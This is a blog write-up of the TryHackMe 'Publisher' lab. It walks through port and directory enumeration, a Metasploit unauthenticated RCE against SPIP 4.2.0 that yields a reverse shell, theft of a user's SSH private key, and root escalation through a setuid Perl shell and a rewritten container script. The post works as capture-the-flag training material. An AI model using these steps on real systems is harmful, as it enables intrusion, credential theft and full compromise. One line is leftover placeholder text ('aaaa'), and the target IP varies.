# TryHackMe - Publisher (Write-Up)

_4 min read · February 28, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Publisher**](https://tryhackme.com/room/publisher) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: josemlwdf

---

## Scanning for Open Ports

The machine IP address in my case is **10.48.188.166**.

As usual:

```bash
nmap 10.48.188.166
sudo nmap -sCV -p 22,80 10.48.188.166
```

![Nmap Output](./img/thm-publisher/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![Publisher: Website](./img/thm-publisher/web.png)

There was nothing interesting on the main page, and I didn’t find anything useful in the page source either.

The site's using SPIP as the CMS.

---

## Futher Enumeration on the Website

I used [**FFuF**](https://www.kali.org/tools/ffuf/) to enumerate the site.

```bash
ffuf -u http://10.48.188.166/FUZZ -w /usr/share/wordlists/dirb/big.txt -s
```

```output
.htpasswd
.htaccess
images
server-status
spip
```

I accessed the `/spip` directory.

![Publisher: Website /spip](./img/thm-publisher/web-spip.png)

Nothing interesting here as well.

I then further enumerated the `/spip` directory.

```bash
ffuf -u http://10.48.188.166/spip/FUZZ -w /usr/share/wordlists/dirb/big.txt -s
```

```output
.htpasswd
.htaccess
LICENSE
config
ecrire
local
prive
squelettes-dist
tmp
vendor
```

After accessing the directories, I found out that `/ecrire` is a login page, and I also found that it is using **SPIP version 4.2.0** in `/local/config.txt`.

---

## Exploitation

I then searched for an exploit for this version and I found [SPIP v4.2.0 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/51536) from Exploit-DB.

Then I fired up my [**MSFconsole**](https://www.kali.org/tools/metasploit-framework/) and searched for it.

```bash
msfconsole -q
search spip
use exploit/multi/http/spip_rce_form
```

![SPIP_RCE_form Options](./img/thm-publisher/spip-msfconsole.png)

Then I set the required options:

```bash
set RHOST 10.49.131.185
set TARGETURI /spip
set LHOST 192.168.223.226
run
```

![Rev Shell](./img/thm-publisher/rev-shell.png)

And I received the shell.

---

## Post-Exploitation

After some enumeration, I found **user flag** in `/home/think` directory.

```bash
pwd
cd ../..
ls -al
cat user.txt
```

![User Flag](./img/thm-publisher/user-flag.png)

So, `think` is a user in this system. I have also checked it on `/etc/passwd`.

I then navigated to `.ssh` directory and saved the private key in my local system.

```bash
cd .ssh
cat id_rsa
```

![id_rsa](./img/thm-publisher/id-rsa.png)

Then I changed the permission and logged in to SSH as Think.

```bash
chmod 600 id_rsa
ssh think@10.49.131.185 -i id_rsa
```

Login successful.

---

## Privilege Escalation

Once Im in the SSH, I performed my privesc checklist.

![SUID Results](./img/thm-publisher/suid.png)

After checking for SUID binaries, I found out that `run_container` is a custom binary.

It executes `/opt/run_container.sh`, but I couldn't modify that file.

I then check for `env` and I found out that Im using `ash` shell.

```bash
cd /etc/apparmor.d
cat usr.sbin.ash
```

```output
# Deny access to certain directories
deny /opt/ r,
deny /opt/** w,
deny /tmp/** w,
deny /dev/shm w,
deny /var/tmp w,
deny /home/** w,
/usr/bin/** mrix,
/usr/sbin/** mrix,
```

As shown here, aaaa.

```bash
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

Then I modified the `/opt/run_container.sh` by just replacing everything with:

```bash
#!/bin/bash
bash -p
```

Then I ran the `run_container`:

```bash
/usr/sbin/run_container
```

I navigated to `/root` directory and retrieved the **root flag**.

```bash
cd /root
cat root.txt
```

![Root Flag](./img/thm-publisher/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

Thank you for reading and see you next time!
